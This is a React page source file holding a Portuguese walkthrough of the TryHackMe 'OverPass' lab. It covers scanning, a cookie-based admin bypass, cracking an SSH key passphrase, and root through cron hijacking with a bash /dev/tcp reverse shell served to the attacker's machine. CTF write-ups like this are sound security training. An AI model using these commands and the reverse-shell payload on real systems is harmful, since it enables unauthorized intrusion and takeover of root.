import { Metadata } from "next";
import { ScrollAnimation } from "@/components/ScrollAnimation";
import { 
  CodeBlock, 
  InlineCode, 
  InfoBlock, 
  SummaryBlock, 
  SuccessBlock 
} from "../../components/ArticleComponents";

export const metadata: Metadata = {
  title: "Try Hack Me - OverPass | fe1ps",
  description: "Walkthrough detalhado da máquina OverPass do TryHackMe, explorando uma chave SSH com senha fraca e escalando privilégios via Crontab Hijacking.",
};

export default function OverPassArticle() {
  return (
    <div className="py-12">
      <div className="container mx-auto px-4">
        <article>
          <ScrollAnimation>
            <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">Try Hack Me - OverPass</h1>
          </ScrollAnimation>
          
          <div className="space-y-12 mt-8">

            <ScrollAnimation delay={200}>
              <InfoBlock>
                <p><strong>Resumo da Máquina</strong></p>
                <p><strong>IP:</strong> <InlineCode>10.201.11.108</InlineCode></p>
                <p><strong>SO:</strong> Ubuntu Linux</p>
                <p><strong>Vetor de Ataque:</strong> Chave SSH privada exposta e protegida por senha fraca, escalação de privilégios via sequestro de tarefa Cron (Crontab Hijacking).</p>
              </InfoBlock>
            </ScrollAnimation>

            <ScrollAnimation delay={300}>
              <p className="text-gray-400">
                <strong>Tags:</strong> <InlineCode>#ctf</InlineCode> <InlineCode>#walkthrough</InlineCode> <InlineCode>#nmap</InlineCode> <InlineCode>#gobuster</InlineCode> <InlineCode>#ssh</InlineCode> <InlineCode>#john</InlineCode> <InlineCode>#privesc</InlineCode> <InlineCode>#cron</InlineCode>
              </p>
            </ScrollAnimation>

            <hr className="border-white/10" />

            <ScrollAnimation delay={200}>
              <section>
                <h2 className="text-2xl font-bold">1. Reconhecimento e Enumeração</h2>
                <p className="mt-4 text-gray-300">O primeiro passo foi escanear a máquina alvo para identificar portas abertas e os serviços em execução.</p>
                
                <h3 className="text-xl font-semibold mt-4">1.1. Varredura com Nmap</h3>
                <p className="mt-2 text-gray-300">Usei o Nmap com os scripts <InlineCode>-sV</InlineCode> (versão dos serviços) e <InlineCode>-sC</InlineCode> (scripts padrão) para uma enumeração inicial.</p>
                <CodeBlock>nmap -sV -sC 10.201.11.108</CodeBlock>
                <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
                <CodeBlock>{`Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 11:27 -03
Nmap scan report for 10.201.11.108
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`}</CodeBlock>

                <SummaryBlock>
                  <p><strong>Pontos de Interesse Encontrados:</strong></p>
                  <ul className="list-disc list-inside mt-2">
                    <li><strong>Porta 22:</strong> SSH (<InlineCode>OpenSSH 7.6p1</InlineCode>)</li>
                    <li><strong>Porta 80:</strong> HTTP (<InlineCode>Golang net/http server</InlineCode>)</li>
                  </ul>
                </SummaryBlock>

                <h3 className="text-xl font-semibold mt-4">1.2. Enumeração de Diretórios Web</h3>
                <p className="mt-2 text-gray-300">Com um servidor web ativo na porta 80, o próximo passo foi procurar por diretórios e arquivos ocultos usando o <strong>GoBuster</strong>.</p>
                <CodeBlock>gobuster dir -u http://10.201.11.108/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt</CodeBlock>
                <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
                <CodeBlock>{`===============================================================
Gobuster v3.8
===============================================================
[+] Url:                     http://10.201.11.108/
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Extensions:              php,txt
===============================================================
/img              (Status: 301) [Size: 0] [--> img/]
/downloads        (Status: 301) [Size: 0] [--> downloads/]
/aboutus          (Status: 301) [Size: 0] [--> aboutus/]
/admin            (Status: 301) [Size: 42] [--> /admin/]
/css              (Status: 301) [Size: 0] [--> css/]
===============================================================`}</CodeBlock>
                <p className="mt-4 text-gray-300">O diretório <InlineCode>/admin/</InlineCode> foi o achado mais promissor para a próxima fase de investigação.</p>
              </section>
            </ScrollAnimation>

            <hr className="border-white/10" />

            <ScrollAnimation delay={200}>
              <section>
                <h2 className="text-2xl font-bold">2. Acesso Inicial (SSH)</h2>
                <p className="mt-4 text-gray-300">Ao acessar o diretório <InlineCode>/admin/</InlineCode>, a página estava restrita. Manipulando os cookies no console do navegador, foi possível obter acesso.</p>
                <CodeBlock>Cookies.set("SessionToken","123");</CodeBlock>
                <p className="mt-4 text-gray-300">Após definir o cookie e atualizar a página, uma chave SSH privada criptografada para um usuário chamado <InlineCode>James</InlineCode> foi revelada.</p>

                <h3 className="text-xl font-semibold mt-4">2.1. Quebrando a Senha da Chave SSH</h3>
                <p className="mt-2 text-gray-300">A chave estava protegida por uma senha (passphrase). Para quebrá-la, utilizei o <strong>John the Ripper</strong>.</p>
                <ol className="list-decimal list-inside mt-4 space-y-4 text-gray-300">
                  <li>
                    <strong>Salvar a chave</strong> em um arquivo chamado <InlineCode>id_rsa</InlineCode> e ajustar suas permissões.
                    <CodeBlock>chmod 600 id_rsa</CodeBlock>
                  </li>
                  <li>
                    <strong>Extrair o hash</strong> da chave usando o script <InlineCode>ssh2john.py</InlineCode>.
                    <CodeBlock>python3 /usr/share/john/ssh2john.py id_rsa {'>'} id_rsa.hash</CodeBlock>
                  </li>
                  <li>
                    <strong>Quebrar o hash</strong> com o <InlineCode>john</InlineCode> e a wordlist <InlineCode>rockyou.txt</InlineCode>.
                    <CodeBlock>john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</CodeBlock>
                    <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
                    <CodeBlock>{`Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
...
james13          (id_rsa)     
...
Session completed.`}</CodeBlock>
                    <SuccessBlock>A senha da chave SSH foi descoberta: <InlineCode>james13</InlineCode></SuccessBlock>
                  </li>
                </ol>

                <h3 className="text-xl font-semibold mt-4">2.2. Obtendo Acesso</h3>
                <p className="mt-2 text-gray-300">Com a chave privada (<InlineCode>id_rsa</InlineCode>) e a senha (<InlineCode>james13</InlineCode>), realizei o login via SSH.</p>
                <CodeBlock>ssh -i id_rsa james@10.201.11.108</CodeBlock>
                <p className="mt-4 text-gray-300">Após inserir a senha <InlineCode>james13</InlineCode>, o acesso ao shell como usuário <InlineCode>james</InlineCode> foi concedido.</p>

                <h3 className="text-xl font-semibold mt-4">2.3. Capturando a Flag do Usuário</h3>
                <p className="mt-2 text-gray-300">Com o acesso inicial, procurei pela flag <InlineCode>user.txt</InlineCode>.</p>
                <CodeBlock>{`james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt`}</CodeBlock>
                <SuccessBlock><strong>user.txt:</strong> <InlineCode>thm{'{...user_flag...}'}</InlineCode></SuccessBlock>
              </section>
            </ScrollAnimation>

            <hr className="border-white/10" />

            <ScrollAnimation delay={200}>
              <section>
                <h2 className="text-2xl font-bold">3. Escalação de Privilégios</h2>
                <p className="mt-4 text-gray-300">Para obter acesso <InlineCode>root</InlineCode>, foi necessário encontrar um vetor de escalação de privilégios no sistema. A enumeração foi feita com o script <InlineCode>lse.sh</InlineCode>.</p>

                <h3 className="text-xl font-semibold mt-4">3.1. Identificando o Vetor (Cron Job)</h3>
                <p className="mt-2 text-gray-300">A análise do <InlineCode>lse.sh</InlineCode> e a verificação manual do arquivo <InlineCode>/etc/crontab</InlineCode> revelaram uma tarefa agendada (cron job) vulnerável, executada a cada minuto como <InlineCode>root</InlineCode>.</p>
                <CodeBlock>{`james@overpass-prod:~$ cat /etc/crontab
...
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`}</CodeBlock>
                <p className="mt-4 text-gray-300">A tarefa baixa e executa um script de <InlineCode>overpass.thm</InlineCode>. A estratégia é sequestrar essa requisição, fazendo com que o domínio <InlineCode>overpass.thm</InlineCode> aponte para a nossa máquina de ataque.</p>

                <h3 className="text-xl font-semibold mt-4">3.2. Exploração (Crontab Hijacking)</h3>
                <ol className="list-decimal list-inside mt-4 space-y-4 text-gray-300">
                  <li>
                    <strong>Modificar o /etc/hosts na máquina alvo:</strong>
                    <p className="mt-2">Adicionei uma entrada para que overpass.thm resolvesse para o IP da minha máquina (10.9.1.139).</p>
                    <CodeBlock>{`# Na máquina alvo (james@overpass-prod)
echo "10.9.1.139 overpass.thm" >> /etc/hosts`}</CodeBlock>
                  </li>
                  <li>
                    <strong>Preparar o payload na máquina do atacante:</strong>
                    <p className="mt-2">Criei a estrutura de diretórios esperada e um buildscript.sh com um payload de reverse shell.</p>
                    <CodeBlock>{'echo "bash -i >& /dev/tcp/10.9.1.139/4444 0>&1" > buildscript.sh'}</CodeBlock>
                  </li>
                  <li>
                    <strong>Servir o payload e iniciar o listener:</strong>
                    <p className="mt-2">Iniciei um servidor web simples para hospedar o script e um listener com netcat para receber a conexão.</p>
                    <CodeBlock>{`# Na máquina do atacante (no diretório ~/)
python3 -m http.server 80

# Em outro terminal
nc -lvnp 4444`}</CodeBlock>
                  </li>
                  <li>
                    <strong>Receber o shell root:</strong>
                    <p className="mt-2">Quando o cron job executou (dentro de um minuto), ele baixou e executou nosso script malicioso, resultando em um shell reverso como root.</p>
                    <CodeBlock>{`listening on [any] 4444 ...
connect to [10.9.1.139] from (UNKNOWN) [10.201.11.108] 58676
bash: cannot set terminal process group (20057): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~#`}</CodeBlock>
                  </li>
                </ol>

                <h3 className="text-xl font-semibold mt-4">3.3. Capturando a Flag Root</h3>
                <p className="mt-2 text-gray-300">Agora como <InlineCode>root</InlineCode>, bastou ler a flag final.</p>
                <CodeBlock>root@overpass-prod:~# cat /root/root.txt</CodeBlock>
                <SuccessBlock><strong>root.txt:</strong> <InlineCode>thm{'{..root_flag...}'}</InlineCode></SuccessBlock>
              </section>
            </ScrollAnimation>

          </div>
        </article>
      </div>
    </div>
  );
}